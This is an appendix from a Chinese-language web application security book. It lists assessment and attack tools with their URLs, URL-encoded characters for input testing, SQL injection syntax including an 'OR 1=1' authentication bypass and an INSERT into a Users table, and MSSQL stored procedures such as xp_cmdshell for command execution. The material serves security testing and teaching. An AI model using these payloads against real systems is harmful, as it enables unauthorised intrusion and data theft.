启用 Cookie 管理</td><td style='text-align: center; word-wrap: break-word;'>✓</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>禁用缓存 SSL 数据</td><td style='text-align: center; word-wrap: break-word;'>✓</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>不要轻易上当受骗。以高度警惕心处理基于因特网的请求和交易。对敏感的 URL（比如，在线银行），手工输入地址或使用已知正确的收藏夹/书签，不要点击超链接</td><td style='text-align: center; word-wrap: break-word;'>✓</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>保持你的计算机设备的物理安全（特别是移动设备，比如笔记本电脑，BlackBerry 终端和移动电话）</td><td style='text-align: center; word-wrap: break-word;'>✓</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>推荐的客户端其他配置</td><td style='text-align: center; word-wrap: break-word;'>✓</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>启用软件自动更新（比如，微软的自动更新服务）</td><td style='text-align: center; word-wrap: break-word;'>✓</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>配置 E-mail 软件以明文阅读 E-mail</td><td style='text-align: center; word-wrap: break-word;'>✓</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>对不需要的 ActiveX 控件设置 Kill Bit</td><td style='text-align: center; word-wrap: break-word;'>✓</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>改变操作系统默认设置（比如，不使用默认的 C:\Windows 文件夹名，而以不常用的 Windows 文件夹名，</td><td style='text-align: center; word-wrap: break-word;'>✓</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>比如 C:\Root，来安装操作系统）</td><td style='text-align: center; word-wrap: break-word;'>✓</td></tr></table>

## 附录 B Web 攻击工具和攻击技术清单

我们在本书中已经讨论了很多评估 Web 应用安全的工具和技术。为了便于在实际中使用，本附录以简短的方式总结了其中最重要的部分。这些内容按照本书各章所述的 Web 攻击技术而展开。

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td colspan="2">Web 浏览器和公开代理</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Internet Explorer</td><td style='text-align: center; word-wrap: break-word;'>http://www.microsoft.com/windows/ie/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Firefox</td><td style='text-align: center; word-wrap: break-word;'>http://www.mozilla.com/firefox/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>公开 HTTP/S 代理</td><td style='text-align: center; word-wrap: break-word;'>http://www.publicproxyservers.com/</td></tr><tr><td colspan="2">用于 HTTP/S 分析的 IE 扩展</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>TamperIE</td><td style='text-align: center; word-wrap: break-word;'>http://www.bayden.com/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>IEWatch</td><td style='text-align: center; word-wrap: break-word;'>http://www.iewatch.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>IE Headers</td><td style='text-align: center; word-wrap: break-word;'>http://www.blunck.info/iehttpheaders.html</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>IE 开发人员工具栏</td><td style='text-align: center; word-wrap: break-word;'>搜索 http://www.microsoft.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>WebDevs 的 IE5 Powertoys</td><td style='text-align: center; word-wrap: break-word;'>http://www.microsoft.com/windows/ie/previous/Webaccess/Webdevaccess.mspx</td></tr><tr><td colspan="2">用于 HTTP/S 分析的 Firefox 扩展</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>LiveHTTP Headers</td><td style='text-align: center; word-wrap: break-word;'>http://livehttpheaders.mozdev.org/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>TamperData for</td><td style='text-align: center; word-wrap: break-word;'>http://tamperdata.mozdev.org</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Modify Headers</td><td style='text-align: center; word-wrap: break-word;'>http://modifyheaders.mozdev.org</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Firefox 的 Web 开发人员扩展</td><td style='text-align: center; word-wrap: break-word;'>http://chrispederick.com/work/Webdeveloper/</td></tr><tr><td colspan="2">HTTP/S 代理工具</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Burp Intruder</td><td style='text-align: center; word-wrap: break-word;'>http://portswigger.net/intruder/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Fiddler HTTP 调试代理</td><td style='text-align: center; word-wrap: break-word;'>http://www.fiddlertool.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>OWASP WebScarab</td><td style='text-align: center; word-wrap: break-word;'>http://www.owasp.org</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Paros 代理</td><td style='text-align: center; word-wrap: break-word;'>http://www.parospoxy.org</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Watchfire PowerTools</td><td style='text-align: center; word-wrap: break-word;'>http://www.watchfire.com/securityzone/product/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>powertools.aspx</td></tr><tr><td colspan="2">用于安全测试的 Web 应用程序例子</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>OWASP/Foundstone SiteGenerator</td><td style='text-align: center; word-wrap: break-word;'>http://owasp.net/forums/thread/428.aspx</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>OWASP WebGoat</td><td style='text-align: center; word-wrap: break-word;'>http://www.owasp.org/software/Webgoat.html</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Foundstone Hacme Bank</td><td style='text-align: center; word-wrap: break-word;'>http://www.foundstone.com/resources/proddesc/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>hacmebank.htm</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Foundstone Hacme Books</td><td style='text-align: center; word-wrap: break-word;'>http://www.foundstone.com/resources/proddesc/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>hacmebooks.htm</td></tr><tr><td colspan="2">命令行工具</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>curl</td><td style='text-align: center; word-wrap: break-word;'>http://curl.haxx.se/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Netcat</td><td style='text-align: center; word-wrap: break-word;'>http://www.securityfocus.com/tools</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Sslpoxy</td><td style='text-align: center; word-wrap: break-word;'>http://www.obdev.at/products/ssl-proxy/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>OpenSSL</td><td style='text-align: center; word-wrap: break-word;'>http://www.openssl.org/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Stunnel</td><td style='text-align: center; word-wrap: break-word;'>http://www.stunnel.org/</td></tr><tr><td colspan="2">网络爬行工具</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Offline Explorer Pro</td><td style='text-align: center; word-wrap: break-word;'>http://www.metaproducts.com/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Lynx</td><td style='text-align: center; word-wrap: break-word;'>http://lynx.browser.org/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Wget</td><td style='text-align: center; word-wrap: break-word;'>http://www.gnu.org/directory/wget.html</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Windows 版本的 Wget</td><td style='text-align: center; word-wrap: break-word;'>http://www.interlog.com/~tcharron/wgetwin.html</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Teleport Pro</td><td style='text-align: center; word-wrap: break-word;'>http://www.tenmax.com/teleport/pro/home.htm</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Black Widow</td><td style='text-align: center; word-wrap: break-word;'>http://www.softbytelabs.com/BlackWidow/</td></tr><tr><td colspan="2">免费的 Web 应用程序安全扫描器</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Nikto</td><td style='text-align: center; word-wrap: break-word;'>http://www.cirt.net/code/nikto.shtml</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>N-Stalker NStealth 免费版</td><td style='text-align: center; word-wrap: break-word;'>http://www.nstalker.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Burp Suite</td><td style='text-align: center; word-wrap: break-word;'>http://www.portswigger.net</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Paros Proxy</td><td style='text-align: center; word-wrap: break-word;'>http://www.parospoxy.org</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>OWASP WebScarab</td><td style='text-align: center; word-wrap: break-word;'>http://www.owasp.org</td></tr><tr><td colspan="2">商业 Web 应用安全扫描器和服务</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Acunetix 公司的 Web 漏洞扫描器</td><td style='text-align: center; word-wrap: break-word;'>http://www.acunetix.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Cenzic Hailstorm</td><td style='text-align: center; word-wrap: break-word;'>http://www.cenzic.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Ecyware GreenBlue</td><td style='text-align: center; word-wrap: break-word;'>http://www.ecyware.com</td></tr><tr><td colspan="2">Inspector</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Syhunt Sandcat Suite</td><td style='text-align: center; word-wrap: break-word;'>http://www.syhunt.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>SPI Dynamics</td><td style='text-align: center; word-wrap: break-word;'>http://www.spidynamics.com</td></tr><tr><td colspan="2">WebInspect</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Watchfire AppScan</td><td style='text-align: center; word-wrap: break-word;'>http://www.watchfire.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>NTObjectives NTOSpider</td><td style='text-align: center; word-wrap: break-word;'>http://www.ntobjectives.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Compuware DevPartner</td><td style='text-align: center; word-wrap: break-word;'>http://www.compuware.com</td></tr><tr><td colspan="2">SecurityChecker</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>WhiteHat Security</td><td style='text-align: center; word-wrap: break-word;'>http://www.whitehatsec.com</td></tr><tr><td colspan="2">代码分析工具</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Jad, Java 反编译器</td><td style='text-align: center; word-wrap: break-word;'>http://www.kpdus.com/jad.html</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Inspector（Bugscan 的前身）</td><td style='text-align: center; word-wrap: break-word;'>http://www.hbgary.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>CodeAssure</td><td style='text-align: center; word-wrap: break-word;'>http://www.securesw.com/products/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>DevInspect</td><td style='text-align: center; word-wrap: break-word;'>http://www.spidynamics.com/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Flawfinder</td><td style='text-align: center; word-wrap: break-word;'>http://www.dwheeler.com/flawfinder/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>RATS</td><td style='text-align: center; word-wrap: break-word;'>http://www.securesw.com/resources/tools.html</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>SPLINT</td><td style='text-align: center; word-wrap: break-word;'>http://lclint.cs.virginia.edu/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>FXCop</td><td style='text-align: center; word-wrap: break-word;'>http://www.gotdotnet.com/team/fxcop/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ITS4</td><td style='text-align: center; word-wrap: break-word;'>http://www.cigital.com/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>PREfast</td><td style='text-align: center; word-wrap: break-word;'>在微软 Visual Studio 2005 中可用</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Prexis</td><td style='text-align: center; word-wrap: break-word;'>http://www.ouncelabs.com/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Coverity</td><td style='text-align: center; word-wrap: break-word;'>http://www.coverity.com</td></tr></table>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>DevPartner Security Checker</td><td style='text-align: center; word-wrap: break-word;'>http://www.compuware.com/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Inspector (Bugscan 的前身)</td><td style='text-align: center; word-wrap: break-word;'>http://www.hbgary.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>二进制分析</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>开放逆向工程代码</td><td style='text-align: center; word-wrap: break-word;'>http://www.openrce.org</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Ollydbg</td><td style='text-align: center; word-wrap: break-word;'>http://www.ollydbg.de</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Ollydbg 论坛</td><td style='text-align: center; word-wrap: break-word;'>http://community.reverse-engineering.net</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>IDA Pro</td><td style='text-align: center; word-wrap: break-word;'>http://www.datarescue.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>剖析工具和技术</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Httpprint, Web 服务器指纹识别工具</td><td style='text-align: center; word-wrap: break-word;'>http://net-square.com/httpprint/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Site Digger</td><td style='text-align: center; word-wrap: break-word;'>http://www.foundstone.com/resources/proddesc/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>sitedigger.htm</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Wayback Machine</td><td style='text-align: center; word-wrap: break-word;'>http://Web.archive.org</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>在 Google 中搜索“+ www.victim.+com”</td><td style='text-align: center; word-wrap: break-word;'>识别 Web 应用程序结构</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>用 Google 搜索“related:www.victim.com”</td><td style='text-align: center; word-wrap: break-word;'>相关 Web 站点</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>用 Google 搜索“parent directory”</td><td style='text-align: center; word-wrap: break-word;'>寻找 robots.txt 文件</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>robots.txt</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>认证</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>任务</td><td style='text-align: center; word-wrap: break-word;'>工具/技术</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>本地 NTLM 代理</td><td style='text-align: center; word-wrap: break-word;'>NTLM 认证代理服务器</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>(APS)</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>自动猜测密码</td><td style='text-align: center; word-wrap: break-word;'>WebCracker</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>自动猜测密码</td><td style='text-align: center; word-wrap: break-word;'>Brutus AET2</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>自动猜测密码</td><td style='text-align: center; word-wrap: break-word;'>Hydra</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>CAPTCHA 解码</td><td style='text-align: center; word-wrap: break-word;'>PWNtcha</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>攻击基于 SQL 的认证</td><td style='text-align: center; word-wrap: break-word;'>使用一个已知用户名，在密</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>码字段输入 FOO&#x27; OR 1 = 1</td></tr></table>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td colspan="3">授权/会话管理</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>任务</td><td style='text-align: center; word-wrap: break-word;'>工具/技术</td><td style='text-align: center; word-wrap: break-word;'>资源</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Cookie 分析</td><td style='text-align: center; word-wrap: break-word;'>CookieSpy</td><td style='text-align: center; word-wrap: break-word;'>http://camtech2000.net/Pages/CookieSpy.html</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Base64 编码/解码</td><td style='text-align: center; word-wrap: break-word;'>Perl MIME::Base64</td><td style='text-align: center; word-wrap: break-word;'>http://search.cpan.org/search?mode=module&amp;query=MIME%3A%3ABase64</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>MD5 编码</td><td style='text-align: center; word-wrap: break-word;'>Perl Digest::MD5 模块</td><td style='text-align: center; word-wrap: break-word;'>http://search.cpan.org/search?mode=module&amp;query=Digest%3A%3AMD5</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>DES 加密/解密</td><td style='text-align: center; word-wrap: break-word;'>mcrypt</td><td style='text-align: center; word-wrap: break-word;'>http://mcrypt.hellug.gr/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>DES 加密/解密</td><td style='text-align: center; word-wrap: break-word;'>Perl Crypt::DES 模块</td><td style='text-align: center; word-wrap: break-word;'>http://search.cpan.org/search?mode=module&amp;query=Crypt%3A%3ADES</td></tr><tr><td colspan="3">WebDAV 工具</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Cadaver, UNIX/Linux 的命令行 WebDAV</td><td style='text-align: center; word-wrap: break-word;'>http://www.Webdav.org/cadaver/</td><td style='text-align: center; word-wrap: break-word;'>客户端</td></tr><tr><td colspan="3">客户端</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>WebDAV 客户端和服务器软件的实现，由 Irvine 的 California 大学列出</td><td style='text-align: center; word-wrap: break-word;'>http://www.ics.uci.edu/~ejw/authoring/implementation.html</td><td style='text-align: center; word-wrap: break-word;'>Web 服务/SOAP 工具</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Web Service Studio</td><td style='text-align: center; word-wrap: break-word;'>http://www.gotdotnet.com/team/tools/Web_svc/default.aspx</td><td style='text-align: center; word-wrap: break-word;'>SOAP 工具</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>WSDigger</td><td style='text-align: center; word-wrap: break-word;'>http://www.foundstone.com/resources/proddesc/wsdigger.htm</td><td style='text-align: center; word-wrap: break-word;'>输入验证</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>任务</td><td style='text-align: center; word-wrap: break-word;'>工具/技术</td><td style='text-align: center; word-wrap: break-word;'>资源</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>跨站脚本测试</td><td style='text-align: center; word-wrap: break-word;'>RSnake 的 XSS 欺骗表单</td><td style='text-align: center; word-wrap: break-word;'>http://ha.ckers.org/ xss.html</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>缓冲区溢出测试</td><td style='text-align: center; word-wrap: break-word;'>NTOMax</td><td style='text-align: center; word-wrap: break-word;'>http://www.foundstone.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>模糊测试</td><td style='text-align: center; word-wrap: break-word;'>SPIKE 代理</td><td style='text-align: center; word-wrap: break-word;'>http://www.immunitysec.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>模糊测试</td><td style='text-align: center; word-wrap: break-word;'>SPI 模糊测试器</td><td style='text-align: center; word-wrap: break-word;'>http://www.spidynamics.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>安全库</td><td style='text-align: center; word-wrap: break-word;'>DevInspect and SecureObjects</td><td style='text-align: center; word-wrap: break-word;'>http://www.spidynamics.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>DevInspect 和 SecureObjects</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>用做测试输入验证的常见字符</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>字符</td><td style='text-align: center; word-wrap: break-word;'>URL 编码</td><td style='text-align: center; word-wrap: break-word;'>注释</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>SQL 注入不可或缺的非常有用的</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>%27</td><td style='text-align: center; word-wrap: break-word;'>字符（逗号，），能产生出错信息。</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>;</td><td style='text-align: center; word-wrap: break-word;'>%3b</td><td style='text-align: center; word-wrap: break-word;'>命令分割符，脚本的行终止符</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>[null]</td><td style='text-align: center; word-wrap: break-word;'>%00</td><td style='text-align: center; word-wrap: break-word;'>文件存取的字符串终止符，命令分隔符</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>[return]</td><td style='text-align: center; word-wrap: break-word;'>%0a</td><td style='text-align: center; word-wrap: break-word;'>命令分割符</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>+</td><td style='text-align: center; word-wrap: break-word;'>%2b</td><td style='text-align: center; word-wrap: break-word;'>在 URL 中代表空格，在 SQL 注入攻击中很有用</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>&lt;</td><td style='text-align: center; word-wrap: break-word;'>%3c</td><td style='text-align: center; word-wrap: break-word;'>打开 HTML 标记</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>&gt;</td><td style='text-align: center; word-wrap: break-word;'>%3e</td><td style='text-align: center; word-wrap: break-word;'>关闭 HTML 标记</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>%</td><td style='text-align: center; word-wrap: break-word;'>%25</td><td style='text-align: center; word-wrap: break-word;'>用于双解码、搜索字段，表示 ASP，JSP 标记</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>?</td><td style='text-align: center; word-wrap: break-word;'>%3f</td><td style='text-align: center; word-wrap: break-word;'>表示 PHP 标记</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>=</td><td style='text-align: center; word-wrap: break-word;'>%3d</td><td style='text-align: center; word-wrap: break-word;'>在一个 URL 参数中放置多个等号</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>(</td><td style='text-align: center; word-wrap: break-word;'>%28</td><td style='text-align: center; word-wrap: break-word;'>SQL 注入</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>)</td><td style='text-align: center; word-wrap: break-word;'>%29</td><td style='text-align: center; word-wrap: break-word;'>SQL 注入</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>[space]</td><td style='text-align: center; word-wrap: break-word;'>%20</td><td style='text-align: center; word-wrap: break-word;'>对较长的脚本是必要的</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>.</td><td style='text-align: center; word-wrap: break-word;'>%2e</td><td style='text-align: center; word-wrap: break-word;'>目录遍历、文件访问</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>/</td><td style='text-align: center; word-wrap: break-word;'>%2f</td><td style='text-align: center; word-wrap: break-word;'>目录遍历</td></tr></table>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>SQL 格式字符</td><td style='text-align: center; word-wrap: break-word;'>描述</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>1</td><td style='text-align: center; word-wrap: break-word;'>终结一条语句</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>--</td><td style='text-align: center; word-wrap: break-word;'>单行注释，忽略该语句剩余的部分</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>+</td><td style='text-align: center; word-wrap: break-word;'>空格。正确格式化语句必需的</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>,@variable</td><td style='text-align: center; word-wrap: break-word;'>附加变量。帮助标识存储过程</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>?Param1=foo&amp;Param1=bar</td><td style='text-align: center; word-wrap: break-word;'>创建“Param=foo, bar”。帮助标识存储过程</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>@@@variable</td><td style='text-align: center; word-wrap: break-word;'>调用一个内部服务器变量</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>PRINT</td><td style='text-align: center; word-wrap: break-word;'>返回一个 ODBC 错误，但不瞄准数据</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>SET</td><td style='text-align: center; word-wrap: break-word;'>分配变量，对多行 SQL 语句有用</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>%</td><td style='text-align: center; word-wrap: break-word;'>匹配零个或多个字符的通配符</td></tr><tr><td colspan="2">基本 SQL 注入语法</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>查询语法</td><td style='text-align: center; word-wrap: break-word;'>结果</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>OR 1=1</td><td style='text-align: center; word-wrap: break-word;'>为绕过逻辑检测而创建恒为真的条件</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>UNION ALL SELECT</td><td style='text-align: center; word-wrap: break-word;'>如果条件为真，从表中检索所有的字段（比如 1</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>field FROM table WHERE condition</td><td style='text-align: center; word-wrap: break-word;'>=1）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>INSERT INTO Users VALUES ('neo', 'trinity')</td><td style='text-align: center; word-wrap: break-word;'>可以绕过认证</td></tr><tr><td colspan="2">有用的 MSSQL Server 变量</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>@@@language</td><td style='text-align: center; word-wrap: break-word;'>@@microsoftversion</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>@@servername</td><td style='text-align: center; word-wrap: break-word;'>@@servicename</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>@@version</td><td style='text-align: center; word-wrap: break-word;'>枚举 SQL Server 的存储过程存储过程</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>sp_columns &lt;table&gt;</td><td style='text-align: center; word-wrap: break-word;'>最重要的存储过程，返回表的字段名</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>sp_configure [name]</td><td style='text-align: center; word-wrap: break-word;'>返回内部数据库设置，指定一个特定的设置并检索</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>sp_dboption</td><td style='text-align: center; word-wrap: break-word;'>查看（或设置）用户可配置的数据库选项</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>sp_depends &lt;object&gt;</td><td style='text-align: center; word-wrap: break-word;'>列出与存储过程相关的表</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>sp_helptext &lt;object&gt;</td><td style='text-align: center; word-wrap: break-word;'>描述对象。它有助于识别可执行存储过程的位置。很少能执行成功</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>sp_helpetendedproc</td><td style='text-align: center; word-wrap: break-word;'>列出所有的扩展存储过程</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>sp_spaceused [object]</td><td style='text-align: center; word-wrap: break-word;'>不带参数，返回数据库名、大小和未分配空间。如果指定了一个对象，它将描述行以及其他对应的信息</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>sp_who2 [username]</td><td style='text-align: center; word-wrap: break-word;'>显示用户名以及它们已经连接的主机，用来连接数据库的应用程序，数据库中当前执行的命令以及其他一些信息。两个过程都接受一个用户名选项。这是用来枚举 SQL 数据库用户（而不是应用程序的用户）的极好方法</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>(and sp_who)</td><td style='text-align: center; word-wrap: break-word;'>用户）的极好方法</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>MS SQL 参数化存储扩展过程</td><td style='text-align: center; word-wrap: break-word;'>扩展存储过程</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>xp_cmdshell</td><td style='text-align: center; word-wrap: break-word;'>等同于 cmd.exe——换句话说，是数据库服务器的完全命令行访问。假定已经安装了 cmd.exe，因此只需输入 dir 来获得目录列表。当前默认的目录是 %SYSTEMROOT%\System32</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>xp_regread &lt;rootkey&gt;, &lt;key&gt;, &lt;value&gt;</td><td style='text-align: center; word-wrap: break-word;'>读取一个注册表键值</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>xp_reg*</td><td style='text-align: center; word-wrap: break-word;'>还有一些其他和注册表相关的过程。读取键值是最有用的</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>xp_servicecontrol &lt;action&gt;, &lt;service&gt;</td><td style='text-align: center; word-wrap: break-word;'>启动或停止一个 Windows 服务</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>xp_terminate_process &lt;PID&gt;</td><td style='text-align: center; word-wrap: break-word;'>根据进程 ID 结束进程</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>MS SQL 非参数化存储扩展过程</td><td style='text-align: center; word-wrap: break-word;'>扩展存储过程</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>xp_loginconfig</td><td style='text-align: center; word-wrap: break-word;'>显示登录信息，特别是登录模式（mixed 等）和默认登录</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>xp_logininfo</td><td style='text-align: center; word-wrap: break-word;'>显示当前登录账号，只对 NTLM 账号有用</td></tr></table>

 </div>

